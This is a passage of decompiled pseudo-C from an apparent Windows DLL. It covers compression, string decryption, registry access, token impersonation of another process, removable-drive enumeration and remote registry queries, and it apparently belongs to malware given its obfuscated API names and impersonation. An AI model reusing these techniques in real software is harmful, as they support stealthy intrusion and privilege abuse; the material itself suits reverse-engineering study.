  _BYTE *v24; // edi
  char v25; // al
  _BYTE *v26; // edi
  unsigned int v28; // [esp+Ch] [ebp-20h]
  unsigned __int8 *v29; // [esp+10h] [ebp-1Ch]
  char v30; // [esp+14h] [ebp-18h]
  size_t v31; // [esp+14h] [ebp-18h]
  unsigned int v32; // [esp+18h] [ebp-14h]
  unsigned int v33; // [esp+1Ch] [ebp-10h]
  unsigned __int8 *v34; // [esp+20h] [ebp-Ch]
  unsigned int v35; // [esp+24h] [ebp-8h]
  unsigned int v36; // [esp+24h] [ebp-8h]

  v5 = a3;
  v34 = a2;
  v33 = (unsigned int)&a2[a1];
  v6 = a2 + 4;
  do
  {
    v29 = v6 + 3;
    v7 = v6 + 1;
    v8 = (unsigned __int8 **)(a5
                            + 4
                            * (((unsigned int)(33 * (*v6 ^ (32 * (v6[1] ^ (32 * (v6[2] ^ (v6[3] << 6))))))) >> 5) & 0x3FFF));
    v9 = *v8;
    if ( *v8 >= a2 )
    {
      v35 = v6 - v9;
      v32 = v6 - v9 - 1;
      if ( v32 <= 0xBFFE )
      {
        if ( v35 <= 0x800
          || v9[3] == *v29
          || (v8 = (unsigned __int8 **)(a5
                                      + 4
                                      * (((unsigned int)(33 * (*v6 ^ (32 * (v6[1] ^ (32 * (v6[2] ^ (v6[3] << 6))))))) >> 5) & 0x7FF ^ 0x201F)),
              v9 = *v8,
              *v8 >= a2)
          && (v35 = v6 - v9, v32 = v6 - v9 - 1, v32 <= 0xBFFE)
          && ((unsigned int)(v6 - v9) <= 0x800 || v9[3] == *v29) )
        {
          if ( *(_WORD *)v9 == *(_WORD *)v6 && v9[2] == v6[2] )
          {
            *v8 = v6;
            v10 = v6 - v34;
            if ( v10 )
            {
              v11 = v10;
              v28 = v10;
              if ( v10 > 3 )
              {
                if ( v10 > 0x12 )
                {
                  v12 = v10 - 18;
                  *v5++ = 0;
                  v30 = v10 - 18;
                  if ( v10 - 18 > 0xFF )
                  {
                    v13 = (v10 - 274) / 0xFF + 1;
                    memset(v5, 0, (v11 - 274) / 0xFF + 1);
                    v5 += v13;
                    do
                    {
                      ++v30;
                      --v13;
                    }
                    while ( v13 );
                    v12 = v30;
                    v11 = v28;
                  }
                }
                else
                {
                  v12 = v10 - 3;
                }
                *v5++ = v12;
              }
              else
              {
                *(v5 - 2) |= v10;
              }
              do
              {
                *v5++ = *v34++;
                --v11;
              }
              while ( v11 );
            }
            v6 = v29 + 1;
            if ( v9[3] != *v29 )
              goto LABEL_46;
            v14 = *v6;
            v6 = v29 + 2;
            if ( v9[4] != v14 )
              goto LABEL_46;
            v15 = *v6;
            v6 = v29 + 3;
            if ( v9[5] != v15 )
              goto LABEL_46;
            v16 = *v6;
            v6 = v29 + 4;
            if ( v9[6] == v16 && (v17 = *v6, v6 = v29 + 5, v9[7] == v17) && (v18 = *v6, v6 = v29 + 6, v9[8] == v18) )
            {
              for ( i = v9 + 9; (unsigned int)v6 < v33 && *i == *v6; ++i )
                ++v6;
              v20 = v6 - v34;
              if ( v35 <= 0x4000 )
              {
                v36 = v32;
                if ( v20 <= 0x21 )
                {
                  LOBYTE(v20) = (v20 - 2) | 0x20;
LABEL_36:
                  *v5 = v20;
LABEL_51:
                  v26 = v5 + 1;
                  *v26 = 4 * v36;
                  v24 = v26 + 1;
                  *v24 = v36 >> 6;
                  goto LABEL_52;
                }
                v20 -= 33;
                *v5 = 32;
LABEL_42:
                ++v5;
                if ( v20 > 0xFF )
                {
                  v31 = (v20 - 256) / 0xFF + 1;
                  memset(v5, 0, v31);
                  v5 += v31;
                  do
                  {
                    LOBYTE(v20) = v20 + 1;
                    --v31;
                  }
                  while ( v31 );
                }
                goto LABEL_36;
              }
              v36 = v35 - 0x4000;
              v21 = (v36 >> 11) & 8;
              if ( v20 > 9 )
              {
                v20 -= 9;
                *v5 = v21 | 0x10;
                goto LABEL_42;
              }
              v22 = (v20 - 2) | v21 | 0x10;
            }
            else
            {
LABEL_46:
              v23 = (_BYTE)--v6 - (_BYTE)v34;
              if ( v35 <= 0x800 )
              {
                *v5 = 4 * (v32 & 7 | (8 * (v23 - 1)));
                v24 = v5 + 1;
                *v24 = v32 >> 3;
LABEL_52:
                v5 = v24 + 1;
                v34 = v6;
                continue;
              }
              v25 = v23 - 2;
              if ( v35 > 0x4000 )
              {
                v36 = v35 - 0x4000;
                *v5 = v25 | (v36 >> 11) & 8 | 0x10;
                goto LABEL_51;
              }
              v36 = v32;
              v22 = v25 | 0x20;
            }
            *v5 = v22;
            goto LABEL_51;
          }
        }
      }
      v7 = v6 + 1;
    }
    *v8 = v6;
    v6 = v7;
  }
  while ( (unsigned int)v6 < v33 - 13 );
  *a4 = v5 - a3;
  return v33 - (_DWORD)v34;
}

//----- (1000BDFF) --------------------------------------------------------
int __cdecl sub_1000BDFF(unsigned __int8 *a1, unsigned int a2, _BYTE *a3, _DWORD *a4, int a5)
{
  unsigned int v5; // ebx
  _BYTE *v6; // esi
  unsigned int v7; // ecx
  unsigned int v8; // eax
  char v9; // al
  size_t v10; // edi
  unsigned __int8 *v11; // eax
  _BYTE *v12; // esi
  unsigned __int8 *v14; // [esp+Ch] [ebp-8h]
  char v15; // [esp+10h] [ebp-4h]

  v5 = a2;
  v6 = a3;
  if ( a2 > 0xD )
  {
    v8 = sub_1000BB20(a2, a1, a3, a4, a5);
    v6 = &a3[*a4];
    a2 = v8;
    v7 = v8;
  }
  else
  {
    v7 = a2;
  }
  if ( v7 )
  {
    v14 = &a1[v5 - v7];
    if ( v6 == a3 && v7 <= 0xEE )
    {
      v9 = v7 + 17;
    }
    else
    {
      if ( v7 <= 3 )
      {
        *(v6 - 2) |= v7;
        goto LABEL_17;
      }
      if ( v7 > 0x12 )
      {
        v9 = v7 - 18;
        *v6++ = 0;
        v15 = v7 - 18;
        if ( v7 - 18 > 0xFF )
        {
          v10 = (v7 - 274) / 0xFF + 1;
          memset(v6, 0, v10);
          v6 += v10;
          do
          {
            ++v15;
            --v10;
          }
          while ( v10 );
          v7 = a2;
          v9 = v15;
        }
      }
      else
      {
        v9 = v7 - 3;
      }
    }
    *v6++ = v9;
LABEL_17:
    v11 = v14;
    do
    {
      *v6++ = *v11++;
      --v7;
    }
    while ( v7 );
  }
  *v6 = 17;
  v12 = v6 + 1;
  *v12++ = 0;
  *v12 = 0;
  *a4 = v12 - a3 + 1;
  return 0;
}

//----- (1000BED3) --------------------------------------------------------
int sub_1000BED3()
{
  int v0; // eax
  int v1; // ecx
  int i; // eax
  int v4; // ecx
  int j; // eax
  int k; // eax
  int v7; // eax
  unsigned __int8 v8; // cl
  unsigned int v9; // eax
  unsigned int m; // ecx
  BOOL v11; // eax
  int v12[4]; // [esp+4h] [ebp-24h]
  int v13; // [esp+14h] [ebp-14h]
  int v14; // [esp+18h] [ebp-10h]
  int v15; // [esp+1Ch] [ebp-Ch]
  int v16; // [esp+20h] [ebp-8h]

  sub_1000B992();
  v0 = sub_1000B992();
  if ( (v0 & v1 & 1) == 0 )
    return -1;
  v12[0] = 0;
  for ( i = 0; i < 16; ++i )
    *((_BYTE *)v12 + i) = i;
  v4 = LOWORD(v12[0]) == 256 && v12[0] == 50462976;
  if ( LOWORD(v12[0]) == 256 && v12[0] == 50462976 )
  {
    for ( j = 0; j < 4; ++j )
      *((_WORD *)&v15 + j) = *(_WORD *)((char *)v12 + j);
    v4 = (_WORD)v15 == 256 && HIWORD(v15) == 513 && (_WORD)v16 == 770 && HIWORD(v16) == 1027;
    if ( (_WORD)v15 == 256 && HIWORD(v15) == 513 && (_WORD)v16 == 770 && HIWORD(v16) == 1027 )
    {
      for ( k = 0; k < 4; ++k )
        *(&v13 + k) = *(int *)((char *)v12 + k);
      v4 = v13 == 50462976 && v16 == 100992003 && v14 == 67305985 && v15 == 84148994;
      if ( v13 == 50462976 && v16 == 100992003 && v14 == 67305985 && v15 == 84148994 )
      {
        v7 = sub_1000BB05();
        v4 = (v7 == 0) & v8;
        if ( v4 == 1 )
        {
          v9 = dword_100247DC;
          for ( m = 0; m < v9; ++m )
            dword_10026D54[m] = m - 3;
          v11 = sub_1000BB08(dword_10026D54);
          v4 = !v11;
          if ( !v11 )
            v4 = sub_1000B996();
        }
      }
    }
  }
  return -(v4 != 1);
}
// 1000BEF2: variable 'v1' is possibly undefined
// 1000BFD4: variable 'v8' is possibly undefined
// 100247DC: using guessed type int dword_100247DC;
// 10026D54: using guessed type int dword_10026D54[];

//----- (1000C026) --------------------------------------------------------
int __cdecl sub_1000C026(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  int result; // eax

  result = -1;
  dword_10026D60 = 1;
  if ( a1
    && (a2 == -1 || a2 == 2)
    && (a3 == -1 || a3 == 4)
    && (a4 == -1 || a4 == 4)
    && (a5 == -1 || a5 == 4)
    && (a6 == -1 || a6 == 4)
    && (a7 == -1 || a7 == 4)
    && (a8 == -1 || a8 == 4)
    && (a9 == -1 || a9 == 4)
    && (a10 == -1 || a10 == 4) )
  {
    return sub_1000BED3();
  }
  return result;
}
// 10026D60: using guessed type int dword_10026D60;

//----- (1000C0A2) --------------------------------------------------------
unsigned int __usercall sub_1000C0A2@<eax>(int a1@<eax>)
{
  return ((a1 + 11) * (a1 + 17)) ^ ((unsigned int)((a1 + 11) * (a1 + 17)) >> 8) ^ ((((a1 + 11) * (a1 + 17)) ^ ((unsigned int)((a1 + 11) * (a1 + 17)) >> 8)) >> 16);
}

//----- (1000C0BC) --------------------------------------------------------
void __cdecl sub_1000C0BC(int a1, unsigned int a2)
{
  unsigned int i; // edi

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + a1) -= sub_1000C0A2(i);
}

//----- (1000C0E0) --------------------------------------------------------
int __cdecl sub_1000C0E0(int a1)
{
  int result; // eax

  if ( !*(_BYTE *)(a1 + 8) )
    return a1 + 11;
  sub_1000C0BC(a1 + 11, *(unsigned __int16 *)(a1 + 9));
  result = a1 + 11;
  *(_BYTE *)(a1 + 8) = 0;
  return result;
}

//----- (1000C10A) --------------------------------------------------------
int __usercall sub_1000C10A@<eax>(_DWORD *a1@<esi>)
{
  int v1; // edi
  struct _OSVERSIONINFOA VersionInformation; // [esp+4h] [ebp-98h] BYREF

  v1 = 0;
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( GetVersionExA(&VersionInformation) )
  {
    v1 = 1;
    *a1 = VersionInformation.dwMajorVersion == 6;
  }
  return v1;
}

//----- (1000C159) --------------------------------------------------------
int __usercall sub_1000C159@<eax>(
        BYTE *a1@<ebx>,
        _DWORD *a2@<edi>,
        HKEY hKey,
        const CHAR *lpSubKey,
        const CHAR *lpValueName)
{
  LSTATUS v5; // eax
  DWORD cbData; // [esp+4h] [ebp-Ch] BYREF
  int v8; // [esp+8h] [ebp-8h]
  HKEY phkResult; // [esp+Ch] [ebp-4h] BYREF

  *a2 = 0;
  phkResult = 0;
  v8 = 0;
  cbData = 4;
  *(_DWORD *)a1 = 0;
  v5 = RegOpenKeyExA(hKey, lpSubKey, 0, 1u, &phkResult);
  if ( v5 || (v5 = RegQueryValueExA(phkResult, lpValueName, 0, 0, a1, &cbData)) != 0 )
  {
    if ( v5 == 2 )
      v8 = 1;
  }
  else
  {
    *a2 = 1;
    v8 = 1;
  }
  if ( phkResult )
    RegCloseKey(phkResult);
  return v8;
}

//----- (1000C1CB) --------------------------------------------------------
int __usercall sub_1000C1CB@<eax>(BYTE *a1@<ebx>, _DWORD *a2@<edi>)
{
  const CHAR *v2; // eax
  const CHAR *v4; // [esp-4h] [ebp-4h]

  v4 = (const CHAR *)sub_1000C0E0((int)&unk_100247E0);
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_10024808);
  return sub_1000C159(a1, a2, HKEY_LOCAL_MACHINE, v2, v4);
}

//----- (1000C1F1) --------------------------------------------------------
int __usercall sub_1000C1F1@<eax>(BYTE *a1@<eax>, _DWORD *a2@<ecx>)
{
  int result; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // [esp-4h] [ebp-14h]
  const CHAR *v8; // [esp-4h] [ebp-14h]
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v9 = 0;
  result = sub_1000C10A(&v9);
  if ( result )
  {
    if ( v9 )
    {
      v7 = (const CHAR *)sub_1000C0E0((int)&unk_10024854);
      v5 = (const CHAR *)sub_1000C0E0((int)&unk_10024878);
      return sub_1000C159(a1, a2, HKEY_CURRENT_USER, v5, v7);
    }
    else
    {
      v8 = (const CHAR *)sub_1000C0E0((int)&unk_100248C0);
      v6 = (const CHAR *)sub_1000C0E0((int)&unk_100248E4);
      return sub_1000C159(a1, a2, HKEY_CURRENT_USER, v6, v8);
    }
  }
  return result;
}

//----- (1000C251) --------------------------------------------------------
int __cdecl sub_1000C251(BYTE Data)
{
  int v1; // ebx
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  int v6; // [esp+Ch] [ebp-8h] BYREF
  HKEY phkResult; // [esp+10h] [ebp-4h] BYREF

  phkResult = 0;
  v1 = 0;
  v6 = 0;
  if ( sub_1000C10A(&v6) )
  {
    if ( v6 )
    {
      v2 = (const CHAR *)sub_1000C0E0((int)&unk_10024900);
      if ( RegOpenKeyExA(HKEY_CURRENT_USER, v2, 0, 2u, &phkResult) )
        goto LABEL_9;
      v3 = (const CHAR *)sub_1000C0E0((int)&unk_10024948);
    }
    else
    {
      v4 = (const CHAR *)sub_1000C0E0((int)&unk_1002496C);
      if ( RegOpenKeyExA(HKEY_CURRENT_USER, v4, 0, 2u, &phkResult) )
        goto LABEL_9;
      v3 = (const CHAR *)sub_1000C0E0((int)&unk_10024988);
    }
    if ( !RegSetValueExA(phkResult, v3, 0, 4u, &Data, 4u) )
      v1 = 1;
  }
LABEL_9:
  if ( phkResult )
    RegCloseKey(phkResult);
  return v1;
}

//----- (1000C2FB) --------------------------------------------------------
int __cdecl sub_1000C2FB(_DWORD *a1, BYTE *a2)
{
  int v2; // eax
  int v4; // [esp+Ch] [ebp-4h] BYREF

  *a1 = 0;
  v4 = 0;
  *(_DWORD *)a2 = 0;
  if ( !sub_1000C1F1(a2, &v4) )
    goto LABEL_2;
  if ( v4 )
    return 0;
  if ( sub_1000C1CB(a2, &v4) )
  {
    if ( !v4 )
    {
      sub_1000C656();
      *(_DWORD *)a2 = sub_1000C6C6();
      *a1 = 1;
      v2 = sub_1000C251(*(_DWORD *)a2) != 0 ? -1 : 1;
      return v2 + 1;
    }
    return 0;
  }
LABEL_2:
  v2 = 0;
  return v2 + 1;
}

//----- (1000C366) --------------------------------------------------------
int __thiscall sub_1000C366(int *this)
{
  if ( this[2] )
    return sub_100032F1(this[2]);
  else
    return sub_100032F1((int)this);
}

//----- (1000C378) --------------------------------------------------------
char __thiscall sub_1000C378(_DWORD *this)
{
  const CHAR *v1; // eax
  HMODULE LibraryA; // edi
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  HANDLE v6; // eax
  const CHAR *v7; // eax
  FARPROC v8; // eax
  FARPROC ProcAddress; // [esp+Ch] [ebp-18h]
  int v11; // [esp+10h] [ebp-14h] BYREF
  HANDLE hObject; // [esp+14h] [ebp-10h]
  DWORD dwProcessId; // [esp+18h] [ebp-Ch] BYREF
  HANDLE hToken; // [esp+1Ch] [ebp-8h] BYREF
  char v15; // [esp+23h] [ebp-1h]

  v11 = 0;
  dwProcessId = 0;
  hToken = 0;
  hObject = 0;
  v15 = 0;
  v1 = (const CHAR *)sub_1000C0E0((int)&unk_1001E87C);
  LibraryA = LoadLibraryA(v1);
  if ( !LibraryA )
    return 0;
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001E8A0);
  ProcAddress = GetProcAddress(LibraryA, v4);
  if ( ProcAddress )
  {
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001E8C8);
    if ( sub_10002790(v5, &dwProcessId) )
    {
      if ( dwProcessId )
      {
        v6 = OpenProcess(0x400u, 0, dwProcessId);
        hObject = v6;
        if ( v6 )
        {
          if ( ((int (__stdcall *)(HANDLE, int, HANDLE *))ProcAddress)(v6, 14, &hToken) )
          {
            if ( ImpersonateLoggedOnUser(hToken) )
            {
              v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001E8EC);
              v8 = GetProcAddress(LibraryA, v7);
              if ( v8 )
              {
                if ( !((int (__stdcall *)(int, int *))v8)(983103, &v11) )
                {
                  this[1] = v11;
                  v15 = 1;
                }
              }
            }
          }
        }
      }
    }
  }
  FreeLibrary(LibraryA);
  if ( hObject )
    CloseHandle(hObject);
  if ( hToken )
    CloseHandle(hToken);
  return v15;
}

//----- (1000C47D) --------------------------------------------------------
HKEY __thiscall sub_1000C47D(_DWORD *this)
{
  const CHAR *v2; // eax
  HMODULE LibraryA; // edi
  HKEY result; // eax
  const CHAR *v5; // eax
  FARPROC ProcAddress; // ebx
  HKEY hKey; // [esp+8h] [ebp-4h] BYREF

  hKey = 0;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E914);
  LibraryA = LoadLibraryA(v2);
  result = (HKEY)this[1];
  if ( result )
    result = (HKEY)RegCloseKey(result);
  if ( LibraryA )
  {
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001E938);
    ProcAddress = GetProcAddress(LibraryA, v5);
    RevertToSelf();
    if ( !((int (__stdcall *)(int, HKEY *))ProcAddress)(983103, &hKey) )
      RegCloseKey(hKey);
    return (HKEY)FreeLibrary(LibraryA);
  }
  return result;
}

//----- (1000C4FA) --------------------------------------------------------
int __cdecl sub_1000C4FA(int a1)
{
  int v1; // ebx
  const char *v2; // eax
  HANDLE FileA; // eax
  int v5; // [esp-4h] [ebp-34h]
  CHAR FileName[29]; // [esp+Ch] [ebp-24h] BYREF
  __int16 v7; // [esp+29h] [ebp-7h]
  char v8; // [esp+2Bh] [ebp-5h]

  v1 = 0;
  memset(FileName, 0, sizeof(FileName));
  v7 = 0;
  v8 = 0;
  v5 = sub_1000C0E0((int)&unk_1001E9B4);
  v2 = (const char *)sub_1000C0E0((int)&unk_1001E9D8);
  _snprintf(FileName, 0x1Fu, v2, a1, v5);
  FileA = CreateFileA(FileName, 0xC0000000, 0, 0, 3u, 0, 0);
  if ( FileA == (HANDLE)-1 )
  {
    if ( GetLastError() == 5 )
      return 1;
  }
  else
  {
    v1 = 2;
    CloseHandle(FileA);
  }
  return v1;
}

//----- (1000C58C) --------------------------------------------------------
int __cdecl sub_1000C58C(int a1)
{
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  FARPROC ProcAddress; // ebx
  HANDLE CurrentThread; // eax
  HMODULE hModule; // [esp+18h] [ebp-1Ch]

  v1 = (const CHAR *)sub_1000C0E0((int)&unk_1001E960);
  hModule = LoadLibraryA(v1);
  if ( !hModule )
    RaiseException(0, 0, 0, 0);
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E984);
  ProcAddress = GetProcAddress(hModule, v2);
  if ( !ProcAddress )
    RaiseException(0, 0, 0, 0);
  CurrentThread = GetCurrentThread();
  if ( !((int (__stdcall *)(HANDLE))ProcAddress)(CurrentThread) )
    RaiseException(0, 0, 0, 0);
  if ( !sub_1000C4FA(a1) )
    RaiseException(0, 0, 0, 0);
  RevertToSelf();
  if ( hModule )
    FreeLibrary(hModule);
  return 1;
}
// 1000C637: conditional instruction was optimized away because %var_20.4==1

//----- (1000C656) --------------------------------------------------------
void sub_1000C656()
{
  DWORD TickCount; // esi
  DWORD CurrentThreadId; // eax
  struct _SYSTEMTIME SystemTime; // [esp+8h] [ebp-18h] BYREF
  struct _FILETIME FileTime; // [esp+18h] [ebp-8h] BYREF

  memset(&SystemTime, 0, sizeof(SystemTime));
  FileTime.dwLowDateTime = 0;
  FileTime.dwHighDateTime = 0;
  GetSystemTime(&SystemTime);
  if ( SystemTimeToFileTime(&SystemTime, &FileTime) )
    TickCount = FileTime.dwLowDateTime ^ FileTime.dwHighDateTime;
  else
    TickCount = GetTickCount();
  CurrentThreadId = GetCurrentThreadId();
  srand(TickCount + CurrentThreadId);
}

//----- (1000C6B6) --------------------------------------------------------
char sub_1000C6B6()
{
  return rand() % 255;
}

//----- (1000C6C6) --------------------------------------------------------
int sub_1000C6C6()
{
  int v0; // edi
  int v1; // esi
  int v2; // edi

  v0 = (unsigned __int8)sub_1000C6B6() << 8;
  v1 = (v0 + (unsigned __int8)sub_1000C6B6()) << 8;
  v2 = (v1 + (unsigned __int8)sub_1000C6B6()) << 8;
  return v2 + (unsigned __int8)sub_1000C6B6();
}

//----- (1000C6FA) --------------------------------------------------------
int __cdecl sub_1000C6FA(int a1, unsigned int a2, _DWORD *a3, const CHAR *a4)
{
  int v4; // esi
  LSTATUS v5; // eax
  bool v6; // zf
  unsigned int v8; // [esp-10h] [ebp-50h] BYREF
  LPCSTR lpMachineName; // [esp+0h] [ebp-40h]
  int v10; // [esp+4h] [ebp-3Ch]
  LSTATUS v11; // [esp+8h] [ebp-38h]
  _DWORD *v12; // [esp+Ch] [ebp-34h]
  DWORD Type; // [esp+10h] [ebp-30h] BYREF
  DWORD cbData; // [esp+14h] [ebp-2Ch] BYREF
  HKEY phkResult; // [esp+18h] [ebp-28h] BYREF
  int v16; // [esp+1Ch] [ebp-24h]
  unsigned int i; // [esp+20h] [ebp-20h]
  HKEY hKey[5]; // [esp+24h] [ebp-1Ch] BYREF
  void *v19; // [esp+38h] [ebp-8h]
  int v20; // [esp+3Ch] [ebp-4h]
  BYTE Data[2048]; // [esp+40h] [ebp+0h] BYREF
  unsigned int v22; // [esp+840h] [ebp+800h]

  v20 = -2;
  v19 = &unk_10022508;
  hKey[4] = (HKEY)SEH_10010F90;
  hKey[3] = (HKEY)NtCurrentTeb()->NtTib.ExceptionList;
  v19 = (void *)(dword_100249C0 ^ (unsigned int)&unk_10022508);
  v22 = (unsigned int)Data ^ dword_100249C0;
  v8 = (unsigned int)Data ^ dword_100249C0;
  hKey[1] = (HKEY)&v8;
  v10 = a1;
  v12 = a3;
  lpMachineName = a4;
  v16 = 1;
  hKey[0] = 0;
  phkResult = 0;
  memset(Data, 0, sizeof(Data));
  Type = 0;
  cbData = 2048;
  v20 = 0;
  for ( i = 0; i < a2; ++i )
  {
    v4 = 16 * i + v10;
    if ( !*(_DWORD *)(v4 + 4) )
      continue;
    if ( RegConnectRegistryA(lpMachineName, *(HKEY *)v4, &phkResult) )
      RaiseException(0, 0, 0, 0);
    v5 = RegOpenKeyExA(phkResult, *(LPCSTR *)(v4 + 4), 0, 1u, hKey);
    if ( v5 )
    {
      v6 = v5 == 2;
    }
    else
    {
      if ( !*(_DWORD *)(v4 + 8) )
        goto LABEL_8;
      memset(Data, 0, sizeof(Data));
      Type = 0;
      cbData = 2048;
      v11 = RegQueryValueExA(hKey[0], *(LPCSTR *)(v4 + 8), 0, &Type, Data, &cbData);
      RegCloseKey(hKey[0]);
      hKey[0] = 0;
      if ( !v11 )
      {
        if ( Type == 1 )
        {
          if ( !*(_DWORD *)(v4 + 12) )
          {
            *v12 = 1;
            break;
          }
          if ( cbData > 0x800 )
            RaiseException(0, 0, 0, 0);
          if ( Data[cbData - 1] )
            RaiseException(0, 0, 0, 0);
          if ( !lstrcmpA((LPCSTR)Data, *(LPCSTR *)(v4 + 12)) )
          {
LABEL_8:
            *v12 = 1;
            break;
          }
        }
        continue;
      }
      v6 = v11 == 2;
    }
    if ( !v6 )
    {
      v16 = 0;
      break;
    }
  }
  v20 = -2;
  if ( hKey[0] )
    RegCloseKey(hKey[0]);
  if ( phkResult )
    RegCloseKey(phkResult);
  return v16;
}
// 100249C0: using guessed type int dword_100249C0;

//----- (1000C8E9) --------------------------------------------------------
int __usercall sub_1000C8E9@<eax>(int a1@<esi>, int a2, unsigned int a3, LPCSTR lpMachineName)
{
  char v4; // al
  int v5; // esi
  int v6; // eax
  int v8; // [esp+10h] [ebp-28h] BYREF
  int v9; // [esp+14h] [ebp-24h] BYREF
  unsigned int i; // [esp+18h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  v9 = 0;
  ms_exc.registration.TryLevel = 0;
  memset(byte_10026D68, 0, sizeof(byte_10026D68));
  if ( lpMachineName )
    v4 = sub_1000D453((int)byte_10026D68, lpMachineName);
  else
    v4 = sub_1000CF0C((int)byte_10026D68, 0, a1, byte_10026D68);
  if ( !v4 )
    RaiseException(0, 0, 0, 0);
  for ( i = 0; i < a3; ++i )
  {
    v8 = 0;
    v5 = 16 * i + a2;
    if ( !sub_1000D1CA(*(LPCSTR *)v5, &v9, (int)byte_10026D68, 0) )
      RaiseException(0, 0, 0, 0);
    if ( v9 )
    {
      v6 = *(_DWORD *)(v5 + 8);
      if ( !v6 )
        return 0;
      if ( !sub_1000C6FA(v6, *(_DWORD *)(v5 + 12), &v8, lpMachineName) )
        RaiseException(0, 0, 0, 0);
      if ( v8 )
      {
        if ( !*(_DWORD *)(v5 + 4) )
          return 0;
      }
      else if ( *(_DWORD *)(v5 + 4) )
      {
        return 0;
      }
    }
  }
  return 1;
}

//----- (1000C9D8) --------------------------------------------------------
int __cdecl sub_1000C9D8(_BYTE *a1)
{
  int v1; // edi
  DWORD LogicalDrives; // ebx
  CHAR RootPathName[4]; // [esp+8h] [ebp-4h] BYREF

  v1 = 0;
  strcpy(RootPathName, "A:\\");
  if ( a1 )
  {
    *a1 = 0;
    LogicalDrives = GetLogicalDrives();
    if ( LogicalDrives )
    {
      RootPathName[0] = 65;
      do
      {
        if ( (LogicalDrives & 1) != 0 && GetDriveTypeA(RootPathName) == 2 )
        {
          if ( *a1 > 0x1Au )
            return 1;
          a1[261 * (unsigned __int8)*a1 + 1] = RootPathName[0];
          if ( !GetVolumeNameForVolumeMountPointA(RootPathName, &a1[261 * (unsigned __int8)*a1 + 2], 0x104u) )
            return v1;
          ++*a1;
        }
        LogicalDrives >>= 1;
        ++RootPathName[0];
      }
      while ( RootPathName[0] <= 90 );
      return 1;
    }
  }
  return v1;
}

//----- (1000CA6D) --------------------------------------------------------
int __cdecl sub_1000CA6D(_BYTE *a1, char *String2, _BYTE *a3)
{
  unsigned __int8 v3; // bl
  int v4; // edi

  v3 = 0;
  v4 = 0;
  if ( *a1 )
  {
    while ( _strnicmp(&a1[261 * v3 + 2], String2, 0x104u) )
    {
      if ( ++v3 >= *a1 )
        return v4;
    }
    *a3 = a1[261 * v3 + 1];
    return 1;
  }
  return v4;
}

//----- (1000CAC3) --------------------------------------------------------
int __cdecl sub_1000CAC3(int a1, int a2, _DWORD *a3)
{
  int v3; // ebx
  int v4; // eax
  const CHAR *v5; // eax
  const char *v6; // eax
  int v8; // [esp-4h] [ebp-90h]
  int v9; // [esp+14h] [ebp-78h] BYREF
  int v10[7]; // [esp+18h] [ebp-74h] BYREF
  char String2[260]; // [esp+34h] [ebp-58h] BYREF

  v3 = 0;
  v10[0] = 28;
  memset(&v10[1], 0, 0x18u);
  v9 = 0;
  memset(String2, 0, sizeof(String2));
  if ( a3 && (dword_10037720(a1, a2, 0, 0, 0, v10) || GetLastError() == 122) && !dword_10037728(&v9, v10[5], 0) )
  {
    v4 = dword_10037724(v9, String2, 260, 0);
    if ( !v4 || v4 == 26 )
    {
      v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001EA00);
      v8 = lstrlenA(v5);
      v6 = (const char *)sub_1000C0E0((int)&unk_1001EA1C);
      *a3 = _strnicmp(v6, String2, v8) == 0;
      return 1;
    }
  }
  return v3;
}
// 10037728: invalid function type has been ignored
// 10037724: invalid function type has been ignored
// 10037720: using guessed type int (__stdcall *dword_10037720)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10037724: using guessed type int (__stdcall *dword_10037724)(_DWORD, _DWORD, _DWORD, _DWORD);
// 10037728: using guessed type int (__stdcall *dword_10037728)(_DWORD, _DWORD, _DWORD);

//----- (1000CBCB) --------------------------------------------------------
HMODULE sub_1000CBCB()
{
  HMODULE result; // eax

  dword_10037714 = 0;
  dword_10037718 = 0;
  dword_1003771C = 0;
  dword_10037724 = 0;
  dword_10037728 = 0;
  if ( hModule )
  {
    FreeLibrary(hModule);
    hModule = 0;
  }
  result = dword_1003770C;
  if ( dword_1003770C )
  {
    result = (HMODULE)FreeLibrary(dword_1003770C);
    dword_1003770C = 0;
  }
  return result;
}
// 10037714: using guessed type int dword_10037714;
// 10037718: using guessed type int dword_10037718;
// 1003771C: using guessed type int dword_1003771C;
// 10037724: using guessed type int dword_10037724;
// 10037728: using guessed type int dword_10037728;

//----- (1000CC1A) --------------------------------------------------------
int __cdecl sub_1000CC1A(_BYTE *a1, _BYTE *a2, int a3, int a4)
{
  CHAR *v4; // ebx
  int v6; // [esp+14h] [ebp-24h]
  int v7[7]; // [esp+18h] [ebp-20h] BYREF

  v6 = 0;
  v7[0] = 28;
  memset(&v7[1], 0, 0x18u);
  if ( a1 )
  {
    if ( *a1 < 0x1Au )
    {
      v4 = (CHAR *)sub_1000D6AB(0x108u);
      if ( v4 )
      {
        *(_DWORD *)v4 = 5;
        if ( dword_10037720(a3, a4, v4, 264, 0, v7) )
        {
          PathAddBackslashA(v4 + 4);
          if ( GetVolumeNameForVolumeMountPointA(v4 + 4, &a1[261 * (unsigned __int8)*a1 + 2], 0x104u) )
          {
            if ( sub_1000CA6D(a2, &a1[261 * (unsigned __int8)*a1 + 2], &a1[261 * (unsigned __int8)*a1 + 1]) )
            {
              ++*a1;
              v6 = 1;
            }
          }
        }
        sub_1000D697(v4);
      }
    }
  }
  return v6;
}
// 10037720: using guessed type int (__stdcall *dword_10037720)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000CD04) --------------------------------------------------------
int __cdecl sub_1000CD04(_BYTE *a1)
{
  _BYTE *v1; // eax
  _BYTE *v2; // esi
